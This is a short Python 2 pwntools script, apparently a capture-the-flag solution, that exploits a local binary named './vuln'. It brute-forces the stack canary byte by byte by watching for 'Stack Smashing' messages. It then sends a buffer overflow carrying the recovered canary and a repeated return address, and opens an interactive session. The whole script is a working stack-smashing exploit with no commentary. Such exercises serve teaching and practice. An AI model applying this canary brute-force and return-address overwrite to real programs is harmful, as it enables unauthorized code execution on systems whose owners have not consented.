#!/usr/bin/env python2
from pwn import *
context.log_level = 'error'
cookie = ""
for _ in range(4):
	for i in range(256):
		p = process("./vuln")
		p.sendline(str(32+len(cookie)+1))
		p.sendline("A"*32+cookie+chr(i))
		res = p.recvall()
		if "Stack Smashing" in res:
			continue
		cookie += chr(i)
		print(i)
		break

p = process("./vuln")
p.sendline("60")
p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+cookie+"\xeb\x86\x04\x08\xeb\x86\x04\x08\xeb\x86\x04\x08\xeb\x86\x04\x08\xeb\x86\x04\x08\xeb\x86\x04\x08")
p.interactive()